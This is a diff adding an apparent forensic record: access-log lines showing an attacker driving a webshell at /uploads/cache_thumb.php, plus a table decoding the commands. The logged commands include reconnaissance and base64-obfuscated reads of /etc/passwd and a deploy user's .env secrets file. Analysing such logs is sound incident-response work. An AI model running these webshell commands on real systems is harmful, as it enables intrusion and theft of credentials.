@@ -1,0 +1,23 @@
+=== webshell execution (13:43-13:47)
+185.220.101.47 - - [10/Oct/2026:13:43:41 +0700] "GET /uploads/cache_thumb.php?c=whoami HTTP/1.1" 200 258 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+185.220.101.47 - - [10/Oct/2026:13:43:56 +0700] "GET /uploads/cache_thumb.php?c=id HTTP/1.1" 200 809 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+185.220.101.47 - - [10/Oct/2026:13:44:35 +0700] "GET /uploads/cache_thumb.php?c=uname%20-a HTTP/1.1" 200 80 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+185.220.101.47 - - [10/Oct/2026:13:44:49 +0700] "GET /uploads/cache_thumb.php?c=pwd HTTP/1.1" 200 995 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+185.220.101.47 - - [10/Oct/2026:13:45:13 +0700] "GET /uploads/cache_thumb.php?c=ls%20-la%20%2Fvar%2Fwww%2Fhtml HTTP/1.1" 200 1313 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+185.220.101.47 - - [10/Oct/2026:13:45:37 +0700] "GET /uploads/cache_thumb.php?c=echo%20Y2F0IC9ldGMvcGFzc3dk%7Cbase64%20-d%7Csh HTTP/1.1" 200 1622 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+185.220.101.47 - - [10/Oct/2026:13:45:49 +0700] "GET /uploads/cache_thumb.php?c=echo%20bHMgLWxhIC9ob21lL2RlcGxveQ%3D%3D%7Cbase64%20-d%7Csh HTTP/1.1" 200 2400 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+185.220.101.47 - - [10/Oct/2026:13:46:06 +0700] "GET /uploads/cache_thumb.php?c=echo%20Y2F0IC9ob21lL2RlcGxveS8uZW52%7Cbase64%20-d%7Csh HTTP/1.1" 200 1037 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+185.220.101.47 - - [10/Oct/2026:13:46:31 +0700] "GET /uploads/cache_thumb.php?c=echo%20Y3JvbnRhYiAtbA%3D%3D%7Cbase64%20-d%7Csh HTTP/1.1" 200 36 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+185.220.101.47 - - [10/Oct/2026:13:47:02 +0700] "GET /uploads/cache_thumb.php?c=ls%20-la%20%2Ftmp HTTP/1.1" 200 176 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+
+=== decoded base64
+whoami HTTP/1.1  ->  whoami HTTP/1.1
+id HTTP/1.1  ->  id HTTP/1.1
+uname -a HTTP/1.1  ->  uname -a HTTP/1.1
+pwd HTTP/1.1  ->  pwd HTTP/1.1
+ls -la /var/www/html HTTP/1.1  ->  ls -la /var/www/html HTTP/1.1
+echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh HTTP/1.1  ->  cat /etc/passwd
+echo bHMgLWxhIC9ob21lL2RlcGxveQ==|base64 -d|sh HTTP/1.1  ->  ls -la /home/deploy
+echo Y2F0IC9ob21lL2RlcGxveS8uZW52|base64 -d|sh HTTP/1.1  ->  cat /home/deploy/.env
+echo Y3JvbnRhYiAtbA==|base64 -d|sh HTTP/1.1  ->  crontab -l
+ls -la /tmp HTTP/1.1  ->  ls -la /tmp HTTP/1.1
